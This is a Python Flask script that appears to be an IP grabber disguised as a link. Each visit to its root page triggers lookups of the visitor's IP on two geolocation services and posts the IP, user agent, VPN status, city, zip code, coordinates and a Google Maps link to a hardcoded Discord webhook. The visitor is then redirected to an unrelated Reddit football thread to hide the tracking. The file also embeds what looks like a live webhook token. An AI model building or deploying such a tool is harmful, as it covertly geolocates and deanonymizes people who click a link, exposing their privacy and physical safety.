from flask import Flask, request, redirect
import requests
import json
from datetime import datetime
import pytz

app = Flask(__name__)

DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1427010775163080868/6Uaf91MUBd4GO3eYSf4y3i0VZkKQh0_pFQFO7H8M42IKWwYQmEkNcisypFHTmvTClpoS"

def get_visitor_info(ip, user_agent):
    try:
        ipapi_url = f"https://ipapi.co/{ip}/json/"
        ipinfo_url = f"https://ipinfo.io/{ip}/json"

        ipapi_resp = requests.get(ipapi_url, timeout=5)
        ipinfo_resp = requests.get(ipinfo_url, timeout=5)

        if ipapi_resp.status_code != 200:
            return None
        ipapi_data = ipapi_resp.json()
        ipinfo_data = ipinfo_resp.json() if ipinfo_resp.status_code == 200 else {}

        # VPN detection: fallback to "No"
        vpn = "No"
        if 'org' in ipinfo_data and 'VPN' in ipinfo_data['org']:
            vpn = "Yes"

        # Use timezone from ipapi or fallback
        timezone_str = ipapi_data.get("timezone", "UTC")
        try:
            tz = pytz.timezone(timezone_str)
        except Exception:
            tz = pytz.UTC

        now = datetime.utcnow()
        local_time = now.replace(tzinfo=pytz.UTC).astimezone(tz)

        # Use ipapi lat/lon by default
        lat = ipapi_data.get("latitude", 0)
        lon = ipapi_data.get("longitude", 0)

        # If ipinfo has loc (lat,lon string), use it if better
        loc = ipinfo_data.get("loc")
        if loc:
            try:
                lat_str, lon_str = loc.split(",")
                lat, lon = float(lat_str), float(lon_str)
            except Exception:
                pass  # fallback to ipapi coords

        info = {
            "ip": ip,
            "user_agent": user_agent[:512],
            "vpn": vpn,
            "country": ipapi_data.get("country_name", "Unknown"),
            "countryCode": ipapi_data.get("country_code", "xx").lower(),
            "region": ipapi_data.get("region", ""),
            "city": ipapi_data.get("city", ""),
            "zip": ipapi_data.get("postal", ""),
            "lat": lat,
            "lon": lon,
            "date": local_time.strftime("%d/%m/%Y"),
            "time": local_time.strftime("%H:%M:%S"),
        }
        return info

    except Exception as e:
        print(f"Error in get_visitor_info: {e}")
        return None

def send_to_discord(info):
    flag_url = f"https://countryflagsapi.com/png/{info['countryCode']}"
    ip_city = f"{info['ip']} ({info['city'] if info['city'] else 'Unknown City'})"
    maps_url = f"https://www.google.com/maps/search/?api=1&query={info['lat']},{info['lon']}"

    embed = {
        "username": "hexdtz",
        "avatar_url": "https://i.imgur.com/Jf0oQ9O.png",  # example avatar
        "embeds": [{
            "title": f"Visitor From {info['country']}",
            "color": 39423,
            "fields": [
                {"name": "IP & City", "value": ip_city, "inline": True},
                {"name": "VPN?", "value": info["vpn"], "inline": True},
                {"name": "User Agent", "value": info["user_agent"]},
                {"name": "Country / Code", "value": f"{info['country']} / {info['countryCode'].upper()}", "inline": True},
                {"name": "Region | City | Zip", "value": f"[{info['region']} | {info['city']} | {info['zip']}]({maps_url} 'Google Maps Location')", "inline": True},
            ],
            "footer": {
                "text": f"{info['date']} {info['time']}",
                "icon_url": "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
            }
        }]
    }
    headers = {"Content-Type": "application/json"}
    requests.post(DISCORD_WEBHOOK_URL, data=json.dumps(embed), headers=headers)

@app.route('/')
def index():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()  # get first IP if multiple forwarded

    user_agent = request.headers.get('User-Agent', 'Unknown')
    info = get_visitor_info(ip, user_agent)
    if info:
        send_to_discord(info)
    return redirect("https://www.reddit.com/r/football/comments/y8xqif/how_to_be_better_in_football_in_a_fast_time/")

if __name__ == "__main__":
    app.run(port=8080)
